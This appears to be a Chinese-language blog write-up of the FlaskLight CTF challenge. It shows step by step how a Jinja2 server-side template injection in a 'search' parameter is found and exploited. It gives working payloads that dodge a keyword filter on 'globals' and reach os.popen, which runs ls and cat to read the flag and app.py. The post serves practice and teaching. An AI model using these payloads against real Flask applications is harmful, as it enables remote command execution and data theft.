---
layout: mypost
title: "[CSCCTF 2019 Qual]FlaskLight"
categories: [ctf_wp]
---

(强烈建议大家先去看这篇文章--关于 SSTI 模板注入的那点事)

1.这个题的题目就已经挺明显的给出信息了，这个使用一个 Flask 框架搭建的一个网站，所以这八成是一个 SSTI 模板注入，然后 f12 查看一下源码

```
<!-- Parameter Name: search -->
 <!-- Method: GET -->
```

源码提示了要用 GET 方法去提交一个名为 search 的参数，所以这题思路就很明确，上来先验证一下猜想，拿个经典 payload 测试一下

![](屏幕截图-2023-10-04-185841-1024x202.png)

结果也很明显了，想办法 SSTI 就行，针对于怎么去模板注入，本人也在博客的另一篇文章有详细的介绍（从概念到 payload），所以再此就不在赘述

2.首先还是经典 config，看看有没有有利用价值的方法，这个方法没找见，但是找到了一个提示，说这个 flag 就在当前的这个目录，和网站源码应该是放在一起的

![](Screenshot_164-1024x383.png)

然后就试了一下这个经典 payload（这个没啥目的哈，就是测试一下这个环境和以前有道题差不多，因为这个 flask.config.Config 太熟悉了）

```
http://5b9e2f12-b126-4504-9977-f35693fec327.node4.buuoj.cn:81/?search={{config.__class__.__base__.__subclasses__()}}
```

![](Screenshot_165-1024x325.png)

然后测测 config

```
{{config.__class__.__init__.__globals__}}
```

![](屏幕截图-2023-10-04-190954-1024x125.png)

发现这个报错了，当时以为就是可能 config 里面不存在方法，对象吧，但现在看来我当时好傻，这咋可能欸

3.然后觉得这个绝对路径不行，我就开始从最开始的根目录开始试，下面是具体的 payload

```
http://5b9e2f12-b126-4504-9977-f35693fec327.node4.buuoj.cn:81/?search={{().__class__.__base__.__subclasses__()}}
```

![](Screenshot_166-1024x476.png)

很明显我就是要用这个类，然后我也不想写脚本去确定它到底是第几位，然后 index（）的话，搞了半天，不知道是不是被禁用了（这里就感觉之前那个 config 的时候，是不是哪个关键词被禁用了，因为这个题目不管是哪里出了问题都是给个 500），一直给 500 的错误，然后就一个一个确定，它是第 59 位，然后就实例化一下这个类，看有啥方法

```
http://5b9e2f12-b126-4504-9977-f35693fec327.node4.buuoj.cn:81/?search={{().__class__.__base__.__subclasses__()[59].__init__.__globals__}}
```

![](屏幕截图-2023-10-04-191805-1024x104.png)

它竟然还是一个 500 错误，这下就坐实了，肯定是哪个关键字被过滤了，然后就一个一个测试，发现给 globals 少写一个 s 就正常，所以肯定是 globals 被过滤了

![](屏幕截图-2023-10-04-191916-1024x163.png)

4.然后这个绕过就很简单，之前那篇文章也给过相关的 payload，下面给出绕过的 payload

```
http://5b9e2f12-b126-4504-9977-f35693fec327.node4.buuoj.cn:81/?search={{().__class__.__base__.__subclasses__()[59].__init__.__getattribute__(%27__gl%27+%27obals__%27)}}
```

![](屏幕截图-2023-10-04-192151-1024x415.png)

5.然后就很舒服了，这里面有 import，那就直接 import os，然后用 popen 执行命令，然后.read 回显，整个动作一气呵成，这个都在那篇文章中有解释，自己不懂的话，可以先去看那篇文章，下面给出 payload，由于一开始题目就提示在同一目录下，所以就直接 ls /flasklight

```
http://5b9e2f12-b126-4504-9977-f35693fec327.node4.buuoj.cn:81/?search={{().__class__.__base__.__subclasses__()[59].__init__.__getattribute__(%27__gl%27+%27obals__%27).__builtins__[%27__imp%27+%27ort__%27](%27o%27+%27s%27).popen(%27ls%20/flasklight%27).read()}}
```

![](屏幕截图-2023-10-04-192516-1024x102.png)

然后直接 cat 另一个文件就行

```
http://5b9e2f12-b126-4504-9977-f35693fec327.node4.buuoj.cn:81/?search={{().__class__.__base__.__subclasses__()[59].__init__.__getattribute__(%27__gl%27+%27obals__%27).__builtins__[%27__imp%27+%27ort__%27](%27o%27+%27s%27).popen(%27cat%20/flasklight/coomme_geeeett_youur_flek%27).read()}}
```

![](image-20231004192718033-1024x106.png)

然后 cat 一下这个源码文件，验证一下猜想，是不是过滤了这个关键字

```
http://5b9e2f12-b126-4504-9977-f35693fec327.node4.buuoj.cn:81/?search={{().__class__.__base__.__subclasses__()[59].__init__.__getattribute__(%27__gl%27+%27obals__%27).__builtins__[%27__imp%27+%27ort__%27](%27o%27+%27s%27).popen(%27cat%20/flasklight/app.py%27).read()}}
```

![](Screenshot_167-1024x135.png)

验证成功哈，ok 那这道题就到这里辣

Finish!!!